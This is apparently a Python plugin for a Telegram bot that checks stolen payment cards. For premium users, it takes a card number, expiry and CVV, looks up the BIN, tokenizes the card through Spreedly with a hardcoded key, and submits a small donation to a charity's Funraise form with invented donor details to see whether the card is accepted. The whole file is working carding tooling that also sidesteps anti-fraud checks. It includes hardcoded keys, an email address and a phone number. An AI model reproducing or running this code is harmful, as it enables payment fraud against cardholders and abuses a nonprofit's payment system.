import json
from values import *
import requests
import re
import time
import asyncio
from colored import fg, bg, attr
from asyncio import sleep
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 

import string
from datos import idchat
import random



@Client.on_message(filters.command(["gg"], ["/", "."]))
async def xi(_, message: Message):
    with open(file='plugins/usuarios/premium.txt',mode='r+',encoding='utf-8') as archivo:
        x = archivo.readlines()
        if str(message.from_user.id) + '\n' in x or message.chat.id in idchat:

            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("<b>⎚ Usar <code>/bg card</code></b>")
                return

            ccs  = data[1]
            card = ccs.split("|")
            cc   = card[0]
            mes  = card[1]
            if not mes:
                await message.reply_text("<b>⎚ Usar <code>/bg card</code></b>")
                return
            ano  = card[2]
            cvv  = card[3]
            bin_code = cc[:6]


            low_ano = lambda x: x[2:] if len(x) == 4 else x
            ano = low_ano(ano)
            session = requests.Session()
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
                    
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            msg=await message.reply(f"""<b>⎚Gateway| Bogota
Card: <code>{ccs}</code>
Progress 🔴 1.12(s)</b>""")
            
            headers = {
              "Host": "core.spreedly.com",
              "spreedly-environment-key": "KvcTOx3FPBgscLs51rjT848DP7p",
              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
              "content-type": "application/json",
              "accept": "*/*",
              "origin": "https://core.spreedly.com",
              "sec-fetch-site": "same-origin",
              "sec-fetch-mode": "cors",
              "sec-fetch-dest": "empty",
              "referer": "https://core.spreedly.com/v1/embedded/number-frame-1.112.html",
              "accept-language": "es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7"
              
            }
            data = {
              "environment_key": "KvcTOx3FPBgscLs51rjT848DP7p",
              "payment_method": {
                "credit_card": {
                  "number":cc,
                  "verification_value":cvv,
                  "first_name": "Cesar",
                  "last_name": "Ramos",
                  "email": "munozcorrales14@gmail.com",
                  "month":mes,
                  "year":ano,
                  "address1": "10010 West Geiger Boulevard",
                  "city": "Spokane",
                  "state": "Washington",
                  "zip": "99224",
                  "country": "United States",
                  "phone_number": "311 391 3845"
                  
                }
                
              }
              
            }
            res = requests.post('https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.112', headers=headers, json=data)
            if 'token' in res.text:
              token = res.json()['transaction']['payment_method']['token']
            print(res.text)
            
            
            headers = {
              'Host': 'platform.funraise.io',
              'accept': 'application/json',
              'x-org-id': '3017646d-29d2-4bb0-a08b-21261658d31f',
              'content-type': 'application/json; charset=UTF-8',
              'sec-ch-ua-mobile': '?1',
              'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
              'origin': 'https://assets.funraise.io',
              'sec-fetch-site': 'same-site',
              'sec-fetch-mode': 'cors',
              'sec-fetch-dest': 'empty',
              'referer': 'https://assets.funraise.io/',
              'accept-language': 'es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7'
            }
            
            data = {
              "clientUuid":"47f3c735-db4e-4cfe-8d48-b1d5e6682bf5",
              "address":"10010 West Geiger Boulevard",
              "addressId":"ChIJH7Powvs9nlQRm1nPn_XfdBQ",
              "addressValue":"10010 West Geiger Boulevard, Spokane, WA, USA",
              "amount":"5.40",
              "anonymous":False,
              "answers":[],
              "bankAccountHolderType":"personal",
              "bankAccountNumber":None,
              "bankAccountType":"checking",
              "bankName":None,
              "bankRoutingNumber":None,
              "baseAmount":"5.00",
              "city":"Spokane",
              "comment":None,
              "company":None,
              "companyId":None,
              "companyMatch":False,
              "country":"United States",
              "currency":"USD",
              "dcfFeeAmount":"0.40",
              "dedicationEmail":None,
              "dedicationMessage":None,
              "dedicationName":None,
              "dedicationType":None,
              "donationAmount":5,
              "donorCoveredFees":True,
              "donorCoversFeesVersion":2,
              "email":"munozcorrales14@gmail.com",
              "emailOptIn":True,
              "employeeEmail":None,
              "firstName":"Cesar",
              "formAllocationId":None,
              "formId":32264,
              "forter":{
                "retailerCookie":None,
                "tokenCookie":"f4ac877a2f02464c99f355dafe1f7569_1698196806093__UDF43s-mnf-a4_13ck_tt"},
              "frequency":"o",
              "hasComment":False,
              "isDedication":False,
              "institutionCategory":None,
              "institutionName":None,
              "intendedAmount":"5.00",
              "lastName":"Ramos",
              "match":False,
              "operationsTip":False,
              "organizationId":"3017646d-29d2-4bb0-a08b-21261658d31f",
              "pageId":None,
              "paymentTechnology":"SPREEDLY",
              "paymentToken":token,
              "paymentType":"card",
              "phone":"311 391 3845",
              "postalCode":"99224",
              "recaptchaNotSolved":True,
              "recaptchaResponse":None,
              "recurring":False,
              "referrer":"https://ihshawaii.org/donate/",
              "sourceUrl":"https://ihshawaii.org/donate/",
              "state":"Washington",
              "storeOrderAmount":"0.00",
              "suffix":None,
              "supportsDonorCoversFees":True,
              "tags":None,
              "tipAmount":"0.00",
              "tipPercent":0,
              "titlePrefix":None,
              "storeOrderOffers":[],
              "ua":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
              "stripeRadarSessionId":None
              
            }
            
            res1 = requests.post('https://platform.funraise.io/api/v2/transaction', headers=headers, json=data)
            print(res1.text)
            id = json.loads(res1.text)['id']
            return id
            
            headers = {
              "Host": "platform.funraise.io",
              "accept": "application/json",
              "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
              "origin": "https://assets.funraise.io",
              "sec-fetch-site": "same-site",
              "sec-fetch-mode": "cors",
              "sec-fetch-dest": "empty",
              "referer": "https://assets.funraise.io/",
              "accept-language": "es-MX,es-419;q=0.9,es;q=0.8,en;q=0.7"
            }
            
            res2 = requests.get(f'https://platform.funraise.io/api/v2/transaction/{id}', headers=headers)
            message = json.loads(res2.text)['message']
            avs = json.loads(res2.text)['decline_code']
            print(message)
